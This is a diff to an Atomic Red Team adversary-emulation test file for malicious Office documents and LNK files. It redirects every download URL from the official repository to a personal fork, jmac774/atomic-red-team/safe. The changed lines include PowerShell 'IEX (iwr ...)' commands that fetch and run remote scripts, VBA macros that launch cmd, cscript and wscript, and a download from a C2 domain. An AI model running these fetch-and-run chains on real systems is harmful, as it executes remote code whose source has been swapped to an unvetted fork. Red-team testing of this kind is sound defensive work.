@@ -37,7 +37,7 @@ atomic_tests:
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+      IEX (iwr "https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
       Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
     cleanup_command: |
@@ -57,7 +57,7 @@ atomic_tests:
     file_url:
       description: URL to retrieve file from
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+      default: https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/LICENSE.txt
   executor:
     command: |
       echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
@@ -93,7 +93,7 @@ atomic_tests:
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+      IEX (iwr "https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
       $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
       Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
     name: powershell
@@ -129,7 +129,7 @@ atomic_tests:
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+      IEX (iwr "https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
       Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
     name: powershell
@@ -164,7 +164,7 @@ atomic_tests:
   executor:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+      IEX (iwr "https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
       $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
       Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
     name: powershell
@@ -290,7 +290,7 @@ atomic_tests:
   executor:
     command: |
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+        IEX (iwr "https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
         Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
     name: powershell
     cleanup_command: |
@@ -324,7 +324,7 @@ atomic_tests:
   description: |
     This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
     Required input agruments are c2_domain and file_name
-    Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
     Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
     Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt
   supported_platforms:
@@ -352,7 +352,7 @@ atomic_tests:
         This required file needs to be place on the user provided c2 domain
         Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt
       type: String
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt
+      default: https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/src/test9-example-payload.txt
     ms_product:
       description: |
         Maldoc application Word or Excel
@@ -381,7 +381,7 @@ atomic_tests:
     name: powershell
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+      IEX (iwr "https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
       $macroCode = Get-Content "#{macro_path}" -Raw
       $URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"
       $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
@@ -397,7 +397,7 @@ atomic_tests:
     - windows
   executor:
     command: |
-      Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
+      Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/jmac774/atomic-red-team/safe/atomics/T1204.002/bin/test10.lnk"
       $file1 = "$env:Temp\test10.lnk"
       Start-Process $file1
       Start-Sleep -s 10
